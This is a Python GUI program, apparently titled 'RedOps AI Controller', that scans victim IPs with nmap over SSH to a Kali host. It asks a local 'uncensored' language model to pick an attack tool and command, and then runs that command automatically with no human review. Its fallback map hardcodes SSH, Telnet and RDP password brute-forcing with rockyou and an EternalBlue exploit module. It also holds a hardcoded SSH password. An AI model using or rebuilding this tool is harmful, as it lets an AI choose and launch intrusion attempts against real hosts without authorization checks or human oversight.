import tkinter as tk
from tkinter import scrolledtext
import paramiko
import requests
import json
import datetime
import os
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas

# === CONFIG ===
KALI_HOST = "192.168.1.218"
KALI_USERNAME = "redops-attack-engine"
KALI_PASSWORD = "i"
LM_STUDIO_URL = "http://localhost:1234/v1/completions"
OUTPUT_DIR = "redops_reports"
os.makedirs(OUTPUT_DIR, exist_ok=True)

ALLOWED_TOOLS = [
    "sqlmap", "hydra", "metasploit", "nikto", "netcat", "john", "gobuster",
    "curl", "sshpass", "python3-pip", "wfuzz", "whatweb", "OpenVAS"
]

# === OFFLINE TOOL MAP ===
OFFLINE_TOOL_MAP = {
    "ftp": ("nmap", "nmap -p 21 --script=ftp-anon,ftp-vsftpd-backdoor,ftp-proftpd-backdoor <TARGET>"),
    "http": ("nikto", "nikto -host <TARGET>"),
    "ssh": ("hydra", "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET>"),
    "msrpc": ("msfconsole", "use exploit/windows/smb/ms17_010_eternalblue"),
    "smb": ("enum4linux", "enum4linux -a <TARGET>"),
    "rdp": ("ncrack", "ncrack -p 3389 -u Administrator -P /usr/share/wordlists/rockyou.txt <TARGET>"),
    "telnet": ("hydra", "hydra -l admin -P /usr/share/wordlists/rockyou.txt telnet://<TARGET>")
}

# === SSH EXECUTION ===
def run_remote_command(command):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(KALI_HOST, username=KALI_USERNAME, password=KALI_PASSWORD)
        stdin, stdout, stderr = client.exec_command(command)
        output = stdout.read().decode() + stderr.read().decode()
        client.close()
        return output
    except Exception as e:
        return f"[ERROR] SSH: {e}"

# === LM Studio QUERY ===
def get_attack_suggestion(prompt):
    try:
        response = requests.post(LM_STUDIO_URL, json={
            "model": "llama-3.1-8b-lexi-uncensored-v2:2",
            "prompt": prompt,
            "temperature": 0.3,
            "max_tokens": 400
        }, timeout=30)
        return response.json().get("completion", "")
    except Exception as e:
        return f"[ERROR] LM Studio: {e}"

# === PARSE AI RESPONSE ===
def parse_ai_suggestion(response):
    try:
        lines = response.strip().splitlines()
        tool = command = ""
        for line in lines:
            if line.lower().startswith("tool:"):
                tool = line.split(":", 1)[1].strip()
            elif line.lower().startswith("command:"):
                command = line.split(":", 1)[1].strip()
        return tool, command
    except Exception as e:
        return "", f"[ERROR] Parsing AI response: {e}"

# === EXTRACT SERVICES FROM NMAP ===
def extract_services(nmap_output):
    services = set()
    for line in nmap_output.splitlines():
        parts = line.strip().split()
        if len(parts) >= 3 and "/" in parts[0]:
            services.add(parts[2].lower())
    return list(services)

# === SAVE JSON REPORT ===
def save_json_report(data, victim_ip):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(OUTPUT_DIR, f"{victim_ip}_attack_report_{timestamp}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    return path

# === SAVE PDF REPORT ===
def save_pdf_report(data, victim_ip):
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    pdf_path = os.path.join(OUTPUT_DIR, f"{victim_ip}_summary_{timestamp}.pdf")
    c = canvas.Canvas(pdf_path, pagesize=letter)
    width, height = letter
    text = c.beginText(40, height - 40)
    text.setFont("Helvetica-Bold", 12)
    text.textLine(f"RedOps AI Attack Report - {victim_ip}")
    text.setFont("Helvetica", 10)
    text.textLine(f"Timestamp: {data['timestamp']}")
    text.textLine("-" * 80)

    text.textLine(">> Nmap Scan Result:")
    for line in data['nmap_scan'].splitlines():
        text.textLine(line[:110])

    text.textLine("-" * 80)
    text.textLine(f">> AI Suggested Tool: {data['ai_tool'] or '[Not Provided]'}")
    text.textLine(f">> Command: {data['ai_command'] or '[Not Provided]'}")

    text.textLine("-" * 80)
    text.textLine(">> Attack Output:")
    attack_output = data['attack_result'].strip() or "[!] Skipped execution. No valid tool found."
    for line in attack_output.splitlines():
        text.textLine(line[:110])

    c.drawText(text)
    c.save()
    return pdf_path

# === MAIN ATTACK FLOW ===
def attack_cycle(victim_ip):
    log(f"[{victim_ip}] Starting scan...")
    nmap_result = run_remote_command(f"nmap -T4 -A {victim_ip}")
    log(f"[{victim_ip}] Scan complete. Querying AI...")

    tools_str = ", ".join(ALLOWED_TOOLS)
    prompt = f"""
Target: {victim_ip}
Nmap Scan Result:
{nmap_result}

Based on this scan, choose ONE most appropriate attack tool from the list:
[{tools_str}]

Return ONLY:
- Tool: <tool name>
- Command: <full command>
"""

    ai_response = get_attack_suggestion(prompt)
    tool, command = parse_ai_suggestion(ai_response)

    # === Fallback if LM Studio fails ===
    if not tool or not command:
        log(f"[{victim_ip}] [!] LM Studio failed. Falling back to offline suggestions...")
        services = extract_services(nmap_result)
        for svc in services:
            if svc in OFFLINE_TOOL_MAP:
                tool, command = OFFLINE_TOOL_MAP[svc]
                command = command.replace("<TARGET>", victim_ip)
                log(f"[{victim_ip}] Fallback Tool: {tool}")
                log(f"[{victim_ip}] Fallback Command: {command}")
                break
        else:
            log(f"[{victim_ip}] [!] No fallback found. Skipping attack.")
            command = ""

    log(f"[{victim_ip}] Suggested Tool: {tool}")
    log(f"[{victim_ip}] Command: {command}")

    if any(t in command for t in ALLOWED_TOOLS):
        log(f"[{victim_ip}] Executing attack: {command}")
        attack_result = run_remote_command(command)
    else:
        attack_result = "[!] Skipped execution. No valid tool found."
        log(f"[{victim_ip}] {attack_result}")

    report = {
        "victim_ip": victim_ip,
        "nmap_scan": nmap_result,
        "ai_tool": tool,
        "ai_command": command,
        "attack_result": attack_result,
        "timestamp": str(datetime.datetime.now())
    }

    json_path = save_json_report(report, victim_ip)
    pdf_path = save_pdf_report(report, victim_ip)
    log(f"[{victim_ip}] Report saved: {json_path}")
    log(f"[{victim_ip}] PDF saved: {pdf_path}")

# === GUI ===
def start_attack():
    targets = victim_input.get("1.0", tk.END).strip().split("\n")
    for target_ip in targets:
        if target_ip:
            attack_cycle(target_ip.strip())

def log(msg):
    log_box.config(state=tk.NORMAL)
    log_box.insert(tk.END, f"{datetime.datetime.now().strftime('%H:%M:%S')} {msg}\n")
    log_box.see(tk.END)
    log_box.config(state=tk.DISABLED)

# GUI Layout
root = tk.Tk()
root.title("RedOps AI Controller - Multi-Victim")

tk.Label(root, text="Enter Victim IP(s), one per line:").pack()
victim_input = scrolledtext.ScrolledText(root, height=5)
victim_input.pack()

tk.Button(root, text="Start Attack Cycle", command=start_attack).pack(pady=5)

log_box = scrolledtext.ScrolledText(root, height=20, state=tk.DISABLED)
log_box.pack()

root.mainloop()
